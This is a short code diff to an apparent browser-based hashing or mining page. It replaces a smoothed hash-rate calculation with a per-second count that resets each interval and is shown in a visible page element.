@@ -55,17 +55,16 @@
             var threads = navigator.hardwareConcurrency || 4;
             console.log("Threads set to:", threads);
 
-            var lastrate = 0;
             var hashesPerSecond = 0;
             var statuss;
 
             function startLogger() {
                 statuss = setInterval(function() {
                     if (typeof totalhashes !== 'undefined') {
-                        lastrate = (totalhashes * 0.5 + lastrate * 0.5);
-                        hashesPerSecond = Math.round(lastrate);
+                        hashesPerSecond = Math.round(totalhashes);
                         $('#hashes-per-second').text(hashesPerSecond);
                         console.log("Hashes/s updated:", hashesPerSecond);
+                        totalhashes = 0; // Сбрасываем, чтобы показывать хэши за последнюю секунду
                     } else {
                         console.log("totalhashes is undefined");
                     }
